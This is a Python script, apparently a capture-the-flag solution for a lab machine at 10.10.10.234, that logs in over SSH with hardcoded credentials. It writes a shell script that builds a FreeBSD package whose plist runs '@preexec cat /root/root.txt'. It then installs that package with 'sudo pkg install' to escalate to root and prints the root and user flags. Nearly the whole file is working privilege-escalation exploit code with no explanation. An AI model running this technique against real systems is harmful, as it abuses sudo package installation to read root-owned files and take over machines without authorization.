import threading, paramiko, time

strdata=''
fulldata=''

class ssh:
    shell = None
    client = None
    transport = None

    def __init__(self, address, username, password):
        print("Connecting to server on ip", str(address) + "...")
        self.client = paramiko.client.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
        self.client.connect(address, username=username, password=password, look_for_keys=False)
        self.transport = paramiko.Transport((address, 22))
        self.transport.connect(username=username, password=password)

        thread = threading.Thread(target=self.process)
        thread.daemon = True
        thread.start()

    def close_connection(self):
        if(self.client != None):
            self.client.close()
            self.transport.close()

    def open_shell(self):
        self.shell = self.client.invoke_shell()

    def send_shell(self, command):
        if(self.shell):
            self.shell.send(command + "\n")
        else:
            print("Shell not opened.")

    def process(self):
        global strdata, fulldata
        while True:
            if self.shell is not None and self.shell.recv_ready():
                alldata = self.shell.recv(1024)
                while self.shell.recv_ready():
                    alldata += self.shell.recv(1024)
                strdata = strdata + str(alldata)
                fulldata = fulldata + str(alldata)
                strdata = self.print_lines(strdata)

    def print_lines(self, data):
        last_line = data
        if '\n' in data:
            lines = data.splitlines()
            for i in range(0, len(lines)-1):
                print(lines[i])
            last_line = lines[len(lines) - 1]
            if data.endswith('\n'):
                print(last_line)
                last_line = ''
        return last_line


sshUsername = "jamie"
sshPassword = "!QAZ2wsx"
sshServer = "10.10.10.234"


connection = ssh(sshServer, sshUsername, sshPassword)
connection.open_shell()
connection.send_shell('''
cat > /usr/home/jamie/pwn.sh <<DELIM 
#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf /tmp/stage
mkdir -p /tmp/stage

cat >> /tmp/stage/+PRE_DEINSTALL <<EOF
# careful here, this may clobber your system
echo nothing
EOF

cat >> /tmp/stage/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo nothing
EOF

mkdir -p /tmp/stage/usr/local/etc
echo "# hello world" > /tmp/stage/usr/local/etc/my.conf
echo "@preexec cat /root/root.txt" > /tmp/stage/plist

cat >> /tmp/stage/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m /tmp/stage/ -r /tmp/stage/ -p /tmp/stage/plist -o .
DELIM
''')
connection.send_shell('chmod +x /usr/home/jamie/pwn.sh ; /usr/home/jamie/pwn.sh')
connection.send_shell('sudo pkg install -y --no-repo-update *.txz && cat /usr/home/jamie/user.txt')
time.sleep(10)
print('==========================')
print("Root Flag : " + strdata[-112:-80])
print('==========================')
print("User Flag : " + strdata[-59:-27])
print('==========================')
connection.close_connection()
